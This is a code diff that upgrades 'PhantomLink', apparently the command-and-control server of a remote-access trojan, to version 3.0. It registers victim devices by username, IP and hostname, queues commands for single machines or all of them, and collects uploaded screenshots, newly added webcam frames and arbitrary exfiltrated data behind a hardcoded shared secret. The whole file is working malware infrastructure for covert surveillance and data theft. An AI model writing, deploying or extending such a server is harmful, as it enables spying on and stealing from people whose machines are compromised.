@@ -1,17 +1,14 @@
-# phantom_server.py | PhantomLink v1.1 | FastAPI | Render Free Tier
-# ══════════════════════════════════════════════════════════════════
-#  pip install fastapi uvicorn
-#  uvicorn phantom_server:app --host 0.0.0.0 --port 10000
-# ══════════════════════════════════════════════════════════════════
+# main.py | PhantomLink v3.0 | FastAPI | Render
+# pip install fastapi uvicorn
+# uvicorn main:app --host 0.0.0.0 --port $PORT
 
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import JSONResponse
 from pydantic import BaseModel
-from typing import Optional
-import time, threading
+import time, threading, asyncio
 
-app = FastAPI(title="PhantomLink Server", docs_url=None, redoc_url=None)
-
+app = FastAPI(title="PhantomLink", docs_url=None, redoc_url=None)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -19,162 +16,133 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ── Config ────────────────────────────────────────────────────────
 SECRET         = "phantomlink2025"
-DEVICE_TIMEOUT = 30      # ثواني — بعدها الجهاز يُعتبر offline
-MAX_DATA_ITEMS = 20      # أقصى عدد data items محفوظة لكل جهاز
-
-# ── In-memory state ───────────────────────────────────────────────
-#  devices  → { device_id: { name, ip, version, last_seen } }
-#  commands → { device_id: { action, data } }   آخر أمر لكل جهاز
-#  screenshots → { device_id: "base64..." }
-#  data_store  → { device_id: [ {type, payload, ts}, ... ] }
+DEVICE_TIMEOUT = 30
+MAX_DATA       = 30
 
 devices:     dict = {}
 commands:    dict = {}
 screenshots: dict = {}
 data_store:  dict = {}
+cam_frames:  dict = {}
 _lock = threading.Lock()
 
-# ── Auth helper ───────────────────────────────────────────────────
-def _auth(secret: str):
-    if secret != SECRET:
-        raise HTTPException(status_code=403, detail="forbidden")
+def _auth(s: str):
+    if s != SECRET:
+        raise HTTPException(403, "forbidden")
 
-# ══════════════════════════════════════════════════════════════════
-#  Models
-# ══════════════════════════════════════════════════════════════════
-
+# ── Models ────────────────────────────────────────────────────────
 class HeartbeatBody(BaseModel):
-    secret:    str
-    device_id: str
-    username:  str
-    ip:        str
-    version:   str
+    secret: str; device_id: str; username: str
+    ip: str; version: str; hostname: str = ""; os_info: str = ""
 
 class SendBody(BaseModel):
-    secret: str
-    action: str
-    data:   str = ""
-    target: str = "all"     # device_id أو "all"
+    secret: str; action: str; data: str = ""; target: str = "all"
 
 class ScreenshotBody(BaseModel):
-    secret:    str
-    device_id: str
-    image:     str          # base64
+    secret: str; device_id: str; image: str
+
+class CamFrameBody(BaseModel):
+    secret: str; device_id: str; image: str
 
 class DataBody(BaseModel):
-    secret:    str
-    device_id: str
-    type:      str
-    payload:   str
+    secret: str; device_id: str; type: str; payload: str
 
-# ══════════════════════════════════════════════════════════════════
-#  Client endpoints  (بيستخدمها phantom_client.py)
-# ══════════════════════════════════════════════════════════════════
-
+# ── Client endpoints ──────────────────────────────────────────────
 @app.post("/heartbeat")
-def heartbeat(body: HeartbeatBody):
-    _auth(body.secret)
+def heartbeat(b: HeartbeatBody):
+    _auth(b.secret)
     with _lock:
-        devices[body.device_id] = {
-            "name":      body.username,
-            "ip":        body.ip,
-            "version":   body.version,
-            "last_seen": time.time(),
-            "online":    True,
+        devices[b.device_id] = {
+            "name": b.username, "ip": b.ip, "version": b.version,
+            "hostname": b.hostname, "os": b.os_info,
+            "last_seen": time.time(), "online": True,
         }
-        # جهاز جديد — command افتراضي none
-        if body.device_id not in commands:
-            commands[body.device_id] = {"action": "none", "data": ""}
+        if b.device_id not in commands:
+            commands[b.device_id] = {"action": "none", "data": ""}
     return {"ok": True}
-
 
 @app.get("/poll")
 def poll(secret: str, device_id: str):
     _auth(secret)
     with _lock:
         cmd = commands.get(device_id, {"action": "none", "data": ""})
-        # امسح الأمر بعد ما العميل يأخذه
         commands[device_id] = {"action": "none", "data": ""}
     return cmd
 
-
 @app.post("/screenshot")
-def upload_screenshot(body: ScreenshotBody):
-    _auth(body.secret)
+def upload_screenshot(b: ScreenshotBody):
+    _auth(b.secret)
     with _lock:
-        screenshots[body.device_id] = body.image
+        screenshots[b.device_id] = b.image
     return {"ok": True}
 
+@app.post("/camframe")
+def upload_camframe(b: CamFrameBody):
+    _auth(b.secret)
+    with _lock:
+        cam_frames[b.device_id] = b.image
+    return {"ok": True}
 
 @app.post("/data")
-def upload_data(body: DataBody):
-    _auth(body.secret)
+def upload_data(b: DataBody):
+    _auth(b.secret)
     with _lock:
-        bucket = data_store.setdefault(body.device_id, [])
-        bucket.append({
-            "type":    body.type,
-            "payload": body.payload,
-            "ts":      time.time(),
-        })
-        # حافظ على آخر N فقط
-        if len(bucket) > MAX_DATA_ITEMS:
-            data_store[body.device_id] = bucket[-MAX_DATA_ITEMS:]
+        bucket = data_store.setdefault(b.device_id, [])
+        bucket.append({"type": b.type, "payload": b.payload, "ts": time.time()})
+        if len(bucket) > MAX_DATA:
+            data_store[b.device_id] = bucket[-MAX_DATA:]
     return {"ok": True}
 
-# ══════════════════════════════════════════════════════════════════
-#  Control Panel endpoints  (بيستخدمها phantom_control.py)
-# ══════════════════════════════════════════════════════════════════
-
+# ── Control Panel endpoints ───────────────────────────────────────
 @app.get("/devices")
 def list_devices(secret: str):
     _auth(secret)
     now = time.time()
-    result = {}
     with _lock:
-        for did, info in devices.items():
-            result[did] = {
-                **info,
-                "online": (now - info["last_seen"]) < DEVICE_TIMEOUT,
-            }
-    return result
-
+        return {
+            did: {**info, "online": (now - info["last_seen"]) < DEVICE_TIMEOUT}
+            for did, info in devices.items()
+        }
 
 @app.post("/send")
-def send_command(body: SendBody):
-    _auth(body.secret)
-    cmd = {"action": body.action, "data": body.data}
+def send_command(b: SendBody):
+    _auth(b.secret)
+    cmd = {"action": b.action, "data": b.data}
     with _lock:
-        if body.target == "all":
+        if b.target == "all":
             for did in devices:
                 commands[did] = cmd
         else:
-            commands[body.target] = cmd
-    return {"ok": True, "target": body.target}
-
+            commands[b.target] = cmd
+    return {"ok": True}
 
 @app.get("/screenshot")
 def get_screenshot(secret: str, device_id: str):
     _auth(secret)
     with _lock:
-        img = screenshots.get(device_id)
-    if not img:
-        return {"image": None}
-    return {"image": img}
+        return {"image": screenshots.get(device_id)}
 
+@app.get("/camframe")
+def get_camframe(secret: str, device_id: str):
+    _auth(secret)
+    with _lock:
+        return {"image": cam_frames.get(device_id)}
 
 @app.get("/data")
 def get_data(secret: str, device_id: str):
     _auth(secret)
     with _lock:
         items = list(data_store.get(device_id, []))
-        # امسح بعد ما لوحة التحكم تاخذها
         data_store[device_id] = []
     return {"items": items}
 
-
-# ── Health check — يمنع Render من النوم ──────────────────────────
+# ── Keep-alive ping ───────────────────────────────────────────────
 @app.get("/ping")
 def ping():
     return {"status": "ok", "ts": time.time()}
+
+@app.get("/")
+def root():
+    return {"status": "PhantomLink v3.0 online"}
+    
